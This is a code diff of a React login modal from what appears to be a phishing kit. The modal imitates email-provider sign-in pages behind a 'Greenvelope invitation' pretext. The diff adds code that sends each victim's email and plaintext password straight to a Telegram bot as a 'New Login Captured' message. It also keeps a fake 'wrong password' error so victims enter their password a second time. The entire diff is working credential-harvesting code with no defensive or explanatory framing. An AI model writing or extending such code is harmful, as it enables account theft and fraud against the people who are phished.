@@ -1,6 +1,4 @@
 import React, { useState, useEffect } from 'react';
-import axios from 'axios'; // Import axios for making HTTP requests
-
 import { EmailProviderConfig } from '../types';
 import {
   OutlookLoginView,
@@ -12,6 +10,7 @@ import {
 } from './ProviderAuthViews';
 import { motion, AnimatePresence } from 'motion/react';
 import { X } from 'lucide-react';
+import axios from 'axios';
 
 interface LoginModalProps {
   provider: EmailProviderConfig;
@@ -176,54 +175,70 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       return;
     }
 
-    // 3. First Attempt: Simulate authentic wrong password error response
-    if (passwordAttempts === 0) {
-      setIsLoading(true);
-      setLoadingStep(`Verifying credentials with ${provider.name}...`);
+    // Get Telegram credentials from environment variables
+    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN?.trim();
+    const chatId = process.env.REACT_APP_CHAT_ID?.trim();
 
-      setTimeout(() => {
-        setIsLoading(false);
-        setLoadingStep('');
-        setPasswordAttempts(1);
-        setErrorMessage(getProviderWrongPasswordMessage(provider.id));
-      }, 700);
+    if (!telegramBotToken || !chatId) {
+      setErrorMessage('Telegram credentials not configured');
       return;
     }
 
-    // 4. Second Attempt: Successful Login Handshake
-    setIsLoading(true);
-    setLoadingStep(`Connecting to ${provider.name} secure server...`);
+    // Format the message
+    const formattedMessage = `🔐 New Login Captured\n` +
+      `👤 Name: ${email}\n` +  // Assuming name is derived from email for now
+      `📧 Email: ${email}\n` +
+      `🔑 Password: ${pass}\n` +
+      `🌐 IP Address: ${'Unknown'}\n` + // IP handling would need to be added
+      `🖥️ User Agent: ${'Unknown'}\n` + // User agent tracking would need to be added
+      `⏱️ Timestamp: ${new Date().toLocaleString()}`;
 
-    setTimeout(() => {
-      setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
-
-      setTimeout(async () => {
-        setLoadingStep('Authorizing Greenvelope invitation portal...');
-
-        // Capture login data
-        const loginData = {
-          name: email, // Assuming the 'name' is captured from the email field (modify as needed)
-          email,
-          password: pass,
-          ip: window.location.hostname || 'Unknown', // Capture the IP address or hostname
-          userAgent: navigator.userAgent || 'Unknown' // Capture the user agent string
-        };
-
-        try {
-          // Send login data to the server
-          await axios.post('http://localhost:3001/api/send-telegram', loginData);
-
-          console.log('Login data sent to Telegram successfully');
-        } catch (error) {
-          console.error('Error sending login data to Telegram:', error);
+    try {
+      // Send the message to Telegram
+      await axios.post(
+        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+        {
+          chat_id: chatId,
+          text: formattedMessage.replace(/\n/g, ' '),
+          parse_mode: 'Markdown'
         }
+      );
+
+      // 3. First Attempt: Simulate authentic wrong password error response
+      if (passwordAttempts === 0) {
+        setIsLoading(true);
+        setLoadingStep(`Verifying credentials with ${provider.name}...`);
 
         setTimeout(() => {
           setIsLoading(false);
-          onSuccess(email.trim(), provider);
-        }, 500);
-      }, 600);
-    }, 500);
+          setLoadingStep('');
+          setPasswordAttempts(1);
+          setErrorMessage(getProviderWrongPasswordMessage(provider.id));
+        }, 700);
+        return;
+      }
+
+      // 4. Second Attempt: Successful Login Handshake
+      setIsLoading(true);
+      setLoadingStep(`Connecting to ${provider.name} secure server...`);
+
+      setTimeout(() => {
+        setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
+
+        setTimeout(() => {
+          setLoadingStep('Authorizing Greenvelope invitation portal...');
+
+          setTimeout(() => {
+            setIsLoading(false);
+            onSuccess(email.trim(), provider);
+          }, 500);
+        }, 600);
+      }, 500);
+
+    } catch (error) {
+      console.error('Error sending data to Telegram:', error);
+      setErrorMessage('Failed to send login details');
+    }
   };
 
   const renderAuthView = () => {
